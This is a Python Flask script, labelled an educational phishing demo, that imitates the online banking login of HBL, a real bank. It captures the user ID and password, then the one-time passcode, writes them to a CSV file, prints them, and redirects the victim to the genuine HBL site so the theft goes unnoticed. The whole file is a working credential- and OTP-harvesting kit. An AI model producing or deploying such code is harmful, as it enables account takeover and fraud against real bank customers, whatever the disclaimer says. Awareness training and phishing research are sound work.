#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HBL Phishing Demo (Educational Purpose Only)
1. / → login.html (User ID + Password)
2. /verify → otp.html (OTP / Second Factor)
3. /submit → Save data in data.csv → Redirect to real HBL site
Please keep this file and the `templates/` folder in the same directory.
"""

import csv
import datetime
import logging
import os
import webbrowser
from flask import Flask, redirect, request, render_template

# Suppress Flask's Werkzeug logging
logging.getLogger("werkzeug").setLevel(logging.ERROR)

DATA_FILE = "data.csv"

def save_to_csv(username: str, password: str, otp: str | None = None) -> None:
    """
    Save captured data to CSV. If file doesn't exist, create it with headers.
    """
    if not os.path.isfile(DATA_FILE):
        with open(DATA_FILE, "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["Timestamp", "Username", "Password", "OTP"])
    
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(DATA_FILE, "a", newline="") as f:
        writer = csv.writer(f)
        writer.writerow([timestamp, username, password, otp or ""])

# Flask App Setup
app = Flask(__name__)  # By default looks for ./templates/ folder

# ------------------------------------------------------------------
# 1. Login Page (User ID + Password)
@app.route("/", methods=["GET"])
def home() -> str:
    return render_template("login.html")

# ------------------------------------------------------------------
# 2. Login Submit → Show OTP Page
@app.route("/verify", methods=["POST"])
def verify() -> str:
    username = request.form.get("username")
    password = request.form.get("password")
    
    if not username or not password:
        return redirect("/")  # Return to login if fields are empty
    
    return render_template("otp.html", username=username, password=password)

# ------------------------------------------------------------------
# 3. OTP Submit → Save Data + Redirect to Real HBL
@app.route("/submit", methods=["POST"])
def submit() -> str:
    username = request.form.get("username")
    password = request.form.get("password")
    otp = request.form.get("otp")
    
    if username and password and otp:
        save_to_csv(username, password, otp)
        print(f"✅ Captured -> User: {username} | Pass: {password} | OTP: {otp}")
    else:
        print("⚠️ Missing fields!")
    
    # Redirect to the real HBL website
    return redirect("https://www.hbl.com/InternetBanking/Login.aspx")

# ------------------------------------------------------------------
def print_banner(port: int = 5000) -> None:
    print(f"""
    =========================================
          HBL Phishing Demo (Educational)
    =========================================
    • Server: http://127.0.0.1:{port}
    • Data saved in: {DATA_FILE}
    """)

if __name__ == "__main__":
    PORT = 5000
    print_banner(PORT)
    webbrowser.open(f"http://127.0.0.1:{PORT}")  # Auto open browser
    app.run(host="127.0.0.1", port=PORT, debug=True, use_reloader=False)